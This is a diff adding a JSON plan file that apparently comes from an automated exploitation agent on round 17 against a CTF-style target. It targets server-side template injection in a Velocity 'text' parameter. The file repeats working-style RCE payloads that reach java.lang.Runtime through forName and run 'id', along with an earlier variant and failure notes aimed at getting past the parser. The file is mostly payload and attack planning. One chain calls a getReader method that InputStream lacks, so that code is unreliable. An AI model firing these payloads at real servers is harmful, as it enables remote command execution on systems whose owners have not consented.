@@ -1,0 +1,116 @@
+{
+  "version": 1,
+  "plan_id": "plan-velocity-ssti-rce-17",
+  "vuln_summary": "Velocity SSTI in 'text' parameter allows RCE. Arithmetic and object access confirmed, but complex RCE payloads were reflected verbatim. Need to simplify payload to avoid 'new' and use direct method calls.",
+  "rationale": "Previous attempts with complex RCE payloads (using 'new' keyword and nested constructors) were reflected verbatim, indicating Velocity parser limitations. We will use a simplified payload that avoids 'new' and uses direct method calls, as suggested by the failure analysis. We'll also test with a simple command like 'id' to confirm execution.",
+  "chain_design": "ssti_reflection -> ssti_execution -> command_execution",
+  "steps": [
+    {
+      "id": 1,
+      "status": "PLANNED",
+      "type": "python",
+      "purpose": "Send a simplified Velocity SSTI RCE payload that avoids 'new' keyword and uses direct method calls to execute the 'id' command and capture output.",
+      "expected_outcome": "Response contains 'uid=' indicating command execution succeeded.",
+      "depends_on": [],
+      "on_failure": "BLOCK_AND_DEBUG",
+      "why_this_step_advances_state": "This step attempts to achieve command execution, transitioning from ssti_execution to command_execution primitive.",
+      "why_this_payload_is_a_mutation": "Previous payloads used 'new' keyword and complex method chains. This payload uses direct method calls on the Runtime object without 'new', simplifying the syntax.",
+      "why_this_is_not_regression": "We are not repeating the exact failed payload; we are using a simplified version that addresses the identified blocker (avoiding 'new').",
+      "target_primitive": "command_execution",
+      "why_this_primitive_advances_chain": "Command execution is the next logical step after confirming object access, leading to RCE and flag retrieval.",
+      "sdk_calls": [
+        {
+          "primitive": "HttpClient.post",
+          "target": "/",
+          "body": {
+            "text": "#set($s=\"\")#set($rt=$s.class.forName(\"java.lang.Runtime\").getRuntime())#set($exec=$rt.exec(\"id\"))#set($input=$exec.getInputStream())#set($reader=$input.getReader())#set($line=$reader.readLine())$line"
+          },
+          "body_format": "form"
+        }
+      ],
+      "imports": [
+        "json",
+        "re",
+        "base64",
+        "hashlib",
+        "hmac",
+        "struct",
+        "http.cookies"
+      ],
+      "code": "",
+      "_ast_imports": [
+        "json",
+        "re",
+        "base64",
+        "hashlib",
+        "hmac",
+        "struct",
+        "http.cookies"
+      ],
+      "_ast_sdk_calls": [
+        {
+          "primitive": "HttpClient.post",
+          "target": "/",
+          "body": {
+            "text": "#set($s=\"\")#set($rt=$s.class.forName(\"java.lang.Runtime\").getRuntime())#set($exec=$rt.exec(\"id\"))#set($input=$exec.getInputStream())#set($reader=$input.getReader())#set($line=$reader.readLine())$line"
+          },
+          "body_format": "form"
+        }
+      ],
+      "_ast_valid": true
+    }
+  ],
+  "history_state": {
+    "rounds": 17,
+    "state": "gadget_triggered",
+    "chain": [
+      "init",
+      "probe_success"
+    ],
+    "primitive": "ssti_reflection",
+    "primitive_state": {
+      "ssti": true,
+      "arithmetic": true,
+      "object_access": true,
+      "rce": false
+    },
+    "detected_primitives": [
+      "ssti_reflection",
+      "ssti_execution",
+      "object_access"
+    ],
+    "primitive_confidence": {
+      "ssti_reflection": 0.9,
+      "ssti_execution": 0.9,
+      "object_access": 0.9
+    },
+    "failure_analysis": {
+      "type": "primitive_only",
+      "detail": "arithmetic_result_in_response confirms SSTI primitive only; no flag or completed exploit chain evidence"
+    },
+    "state_transition_blocker": "step 3 payload was reflected verbatim in <h2 class=\"fire\"> tag, not executed. The full RCE chain was echoed as plain text, indicating that the Velocity parser did not evaluate the directives in that specific payload. Possible cause: use of 'new' keyword or complex method chaining not supported in this context.",
+    "next_required_action": "Simplify the RCE payload to avoid 'new' keyword. Use a known working Velocity 1.7 RCE chain such as: #set($s=\"\")#set($rt=$s.class.forName(\"java.lang.Runtime\"))#set($exec=$rt.getRuntime().exec(\"id\"))#set($input=$exec.getInputStream())#set($scanner=new java.util.Scanner($input).useDelimiter(\"\\\\A\"))$scanner.next() — but this was already tried. Instead, try using the 'getRuntime' method directly without 'new': #set($rt=$s.class.forName(\"java.lang.Runtime\").getRuntime())#set($exec=$rt.exec(\"id\"))#set($input=$exec.getInputStream())#set($reader=$input.getReader())#set($line=$reader.readLine())$line",
+    "exploit_momentum": false,
+    "confidence": 0.7,
+    "repro_success": false
+  },
+  "primitive_context": {
+    "current_primitive": "ssti_reflection",
+    "allowed_next_primitives": [
+      "ssti_execution",
+      "blind_ssti",
+      "template_access",
+      "configuration_disclosure",
+      "file_read",
+      "command_execution"
+    ],
+    "candidate_routes": [
+      {
+        "route": "ssti_reflection__ssti_execution__command_execution",
+        "status": "in_progress",
+        "score": 80
+      }
+    ]
+  },
+  "platform": "Windows"
+}
